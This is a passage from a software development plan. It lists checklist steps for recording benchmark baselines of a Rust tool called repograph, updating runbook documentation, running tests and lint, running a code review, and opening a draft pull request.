Expected: PASS.

- [ ] **Step 6: Record the baseline on all four arms**

```bash
cd ~/bench/beauty-crm-502e8a6d && for arm in "--no-dense" ""; do for cases in bench/cases.jsonl bench/dev-cases.jsonl; do /Users/max/Documents/projects/repograph/target/release/repograph $arm bench --cases "$cases" | tail -2; done; done | tee /private/tmp/g15-baseline.txt
```

Expected: every count and every p90 identical to the recorded arms; the anchor totals are new and are the baseline. Write them into `docs/bench/next-version-gaps.md` under G15 with the commit they were read at.

- [ ] **Step 7: State the precondition in the runbook**

In `docs/bench/runbook.md`, add G23's three: reader rows are taken n≥2 and read as a median, against a store no writer in the session has touched, on a machine whose load is stated. One paragraph, with G23's own numbers as the reason (max RSS bouncing 1.36–1.56 GB on **both** binaries, wider than the 5% bar it was judged against).

- [ ] **Step 8: Commit**

```bash
git add src/bench.rs src/main.rs docs/bench/runbook.md docs/bench/next-version-gaps.md && git commit -m "test(bench): the summary counts anchors reached, and the suite can repeat itself"
```

---

### Task 7: Review, prove, open the PR

- [ ] **Step 1: Run the full suite and the lint**

```bash
cargo test --manifest-path /Users/max/Documents/projects/repograph/Cargo.toml && cargo clippy --manifest-path /Users/max/Documents/projects/repograph/Cargo.toml --all-targets -- -D warnings
```

- [ ] **Step 2: Run the code review at the level the router picks**

Run `/code-review` with `--fix` on the branch diff, apply what it finds, re-run the suite, and commit the applied findings separately.

- [ ] **Step 3: Open the PR as a draft**

```bash
gh auth switch --user devmaxxx && gh pr create --draft --title "fix: six defects the ledger names — a command a clone cannot run, a failure that read as coverage, and four more" --body-file /private/tmp/critical-defects-pr.md
```

The body names, per task, the gap it closes, the gate it met, and the floors it did not move. It ends with the trailer line the repository requires.
